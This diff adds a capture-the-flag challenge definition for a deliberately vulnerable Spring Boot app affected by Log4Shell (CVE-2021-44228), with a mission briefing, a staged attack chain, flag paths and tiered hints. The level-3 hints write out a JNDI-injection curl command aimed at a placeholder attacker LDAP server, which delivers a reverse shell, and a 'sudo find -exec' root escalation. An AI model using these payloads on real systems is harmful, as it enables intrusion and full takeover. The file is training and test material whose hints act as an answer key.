@@ -1,0 +1,149 @@
+name: "Log4Shell Spring Boot"
+slug: "log4shell-spring"
+difficulty: "medium"
+description: >
+  A Spring Boot inventory management API running Apache Log4j 2.14.1,
+  vulnerable to CVE-2021-44228 (Log4Shell). The application logs user-controlled
+  HTTP headers through Log4j, enabling JNDI injection for remote code execution.
+briefing: |
+  MISSION BRIEFING - OPERATION TIMBER FALL
+  =========================================
+
+  Intelligence has identified a vulnerable inventory management system deployed
+  by a target organization. The application is built on Spring Boot with Java 8
+  and uses Apache Log4j for logging.
+
+  Your objective is to gain initial access through the Log4Shell vulnerability
+  (CVE-2021-44228), escalate privileges, and obtain the root flag.
+
+  PHASE 1 - RECONNAISSANCE
+    Identify the technology stack. The application leaks information through
+    HTTP response headers and error pages that reveal the underlying framework
+    and Java version.
+
+  PHASE 2 - INITIAL ACCESS
+    The application logs certain HTTP headers using Log4j. Craft a JNDI lookup
+    string in a logged header to trigger remote code execution. You will need
+    to set up a rogue LDAP/RMI server to serve a malicious Java class.
+
+  PHASE 3 - PRIVILEGE ESCALATION
+    Once you have a foothold, enumerate the system for misconfigurations.
+    The application service account has been granted elevated permissions
+    that can be abused to escalate to root.
+
+  PHASE 4 - POST-EXPLOITATION
+    Obtain the root flag to complete the mission.
+
+  Good luck, operator.
+author: "howl-team"
+cves:
+  - "CVE-2021-44228"
+tags:
+  - "log4j"
+  - "log4shell"
+  - "spring-boot"
+  - "java"
+  - "jndi-injection"
+  - "rce"
+  - "gtfobins"
+  - "sudo"
+services:
+  - name: "spring-boot-api"
+    port: 8080
+    protocol: "http"
+    description: "Spring Boot inventory management REST API"
+
+attack_chain:
+  - name: "Reconnaissance"
+    description: >
+      Identify the Spring Boot and Java technology stack by examining HTTP
+      response headers (X-Powered-By, Server), error pages, and default
+      Spring Boot endpoints. Determine the application is running Java 8
+      with Spring Boot, which suggests potential Log4j usage.
+    tools_suggested:
+      - "nmap"
+      - "curl"
+      - "whatweb"
+      - "nikto"
+    flag:
+      type: "stage"
+      path: "/opt/app/recon_flag.txt"
+    points: 100
+    hints:
+      - level: 1
+        text: "Send requests and carefully examine ALL response headers. Spring Boot apps often reveal their stack."
+      - level: 2
+        text: "Try requesting a path that does not exist. Spring Boot has a distinctive error page format."
+      - level: 3
+        text: "Look at the /actuator endpoint if available, and check the X-Powered-By or Server headers for version info."
+
+  - name: "Initial Access - Log4Shell RCE"
+    description: >
+      Exploit CVE-2021-44228 by injecting a JNDI lookup string into an HTTP
+      header that the application logs via Log4j. The X-Api-Version and
+      User-Agent headers are logged directly. Set up a rogue LDAP server
+      (e.g., with marshalsec or JNDI-Exploit-Kit) to serve a malicious Java
+      class that provides a reverse shell.
+    tools_suggested:
+      - "curl"
+      - "marshalsec"
+      - "jndi-exploit-kit"
+      - "netcat"
+      - "python3"
+    flag:
+      type: "user"
+      path: "/home/app/user.txt"
+    points: 300
+    hints:
+      - level: 1
+        text: "The application logs HTTP headers. Try injecting a JNDI lookup string like ${jndi:ldap://YOUR_IP/test} in request headers."
+      - level: 2
+        text: "The X-Api-Version header is explicitly logged by the application. Use it as your injection point."
+      - level: 3
+        text: "Set up a rogue LDAP server with marshalsec, host a malicious Java class on an HTTP server, and send: curl -H 'X-Api-Version: ${jndi:ldap://YOUR_IP:1389/exploit}' http://TARGET:8080/api/items"
+
+  - name: "Privilege Escalation - Sudo Find"
+    description: >
+      The 'app' user has sudo permissions to run /usr/bin/find without a
+      password. This is a classic GTFOBins vector that allows arbitrary
+      command execution as root through the -exec flag.
+    tools_suggested:
+      - "sudo"
+      - "find"
+      - "linpeas"
+    flag:
+      type: "stage"
+      path: "/opt/escalation_flag.txt"
+    points: 200
+    hints:
+      - level: 1
+        text: "Check what commands the current user can run with elevated privileges."
+      - level: 2
+        text: "Run 'sudo -l' to list sudo permissions. The find command has a known privilege escalation technique."
+      - level: 3
+        text: "Use: sudo /usr/bin/find /tmp -name anything -exec /bin/sh -c 'cat /opt/escalation_flag.txt' \\;"
+
+  - name: "Post-Exploitation - Root Flag"
+    description: >
+      Use the sudo find escalation to obtain a root shell and read the
+      final flag.
+    tools_suggested:
+      - "sudo"
+      - "find"
+    flag:
+      type: "root"
+      path: "/root/root.txt"
+    points: 400
+    hints:
+      - level: 1
+        text: "You already know how to run commands as root. Use the same technique to get a root shell."
+      - level: 2
+        text: "Use find with -exec to spawn an interactive shell as root."
+      - level: 3
+        text: "Run: sudo /usr/bin/find /tmp -name anything -exec /bin/bash \\; then cat /root/root.txt"
+
+par_time_minutes: 60
+
+docker:
+  compose_file: "docker-compose.yml"
+  build_required: true
